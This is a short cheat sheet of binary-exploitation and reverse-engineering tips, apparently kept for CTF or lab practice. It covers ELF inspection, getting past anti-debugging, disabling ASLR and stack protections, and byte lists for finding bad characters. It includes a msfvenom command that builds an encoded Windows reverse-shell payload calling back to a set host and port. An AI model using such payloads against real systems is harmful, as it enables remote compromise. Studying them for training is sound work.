Tips

## General stuff

- If after injecting your payload, after a push function, your payload become weird, increase the size of the stack.

- try ```strings```, and ```ltrace```

- If anti debugging options seem enabled, put hardware breakpoint in IDA (right click, put breakpoint, then edit breakpoint, hardware)

- Need an argument in hex ? or other format (pay attention to sign / unsigned, it depends of the binary ): https://cryptii.com/pipes/integer-encoder

- Always check the format of the input ! You can see sometimes in R2 ```%d %s``` etc. Because it will be important after.

---

## print informations about an elf 

- ```readelf -h <binary> ```

---

## Don't understand an instruction on windows 32 bits ? 

- https://en.wikipedia.org/wiki/Win32_Thread_Information_Block

---

##  Find opcodes  

- http://ref.x86asm.net/coder32.html

---

## Statif ELF Parser : 

- http://www.elfparser.com/

---

## View the name of the functions inside a binary 

- ```readelf -a <binary> | grep <function> | grep -vi glibc```

---

## Create a binary without any protection

1. ```echo 0 > /proc/sys/kernel/randomize_va_space```
2. disable stack canary, stack is executable, PIE disable : ```gcc -o vuln -fno-stack-protector -no-pie -z execstack vuln.c```

---

## Ptrace protection

- if you have an error because of ptrace protection and a segmentation fault, try to dump it before the call in gdb :  
1. ```catch syscall ptrace```
2. ```run```
3. ```generate-core-file binary.dump```

---

## Check security in place

- ```checksec```

---

## python3 and encoding

- send payload in a oneliner  : ```python -c 'import sys;sys.stdout.buffer.write(b"\xff\xa...")'```

## Msfvenom generate shell in ASM

`msfvenom -l payloads` (or whatever, encoder etc), then grep

Example : `msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.156 LPORT=4343 -f c -b "\x00\x0a\x0d" -e x86/shikata_ga_nai  EXITFUNC=thread`


the `-f c` is for a c formated shell code

If there are bad characters, use `-b <Badchars>`, and use `-e` to encode
(shikata_ga_nai for the example)

Don't forget to add nop code before (\x90)

## List of all chars (to search for bad chars)
```
\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```